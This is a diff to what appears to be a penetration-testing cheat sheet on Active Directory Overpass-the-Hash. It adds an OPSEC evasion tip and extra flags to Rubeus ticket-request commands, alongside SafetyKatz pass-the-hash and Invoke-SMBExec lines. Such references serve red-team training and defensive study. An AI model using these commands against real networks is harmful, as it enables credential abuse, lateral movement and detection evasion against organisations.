@@ -106,6 +106,7 @@ Invoke-SMBExec -Target <COMPUTERNAME> -Domain <DOMAIN> -Username <USERNAME> -Has
 
 ### Overpass The Hash
 - Over Pass the hash (OPTH) generate tokens(kerberos) from hashes or keys. Needs elevation (Run as administrator)
+- OPSEC TIP: Use aes256 keys!
 
 #### Calculate NTLM hash
 ```
@@ -126,12 +127,12 @@ SafetyKatz.exe "sekurlsa::pth /user:<USER> /domain:<DOMAIN> /aes256:<AES256KEYS>
 #### Rubeus
 - Below doesn't need elevation
 ```
-Rubeus.exe asktgt /user:<USER> /rc4:<NTLM HASH> /ptt
+Rubeus.exe asktgt /user:<USER> /rc4:<NTLM HASH> /domain /nowrap /ptt
 ```
 
 - Below command needs elevation
 ```
-Rubeus.exe asktgt /user:<USER> /aes256:<AES256KEYS> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+Rubeus.exe asktgt /user:<USER> /aes256:<AES256KEYS> /domain /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 ```
 
 ### Double hop
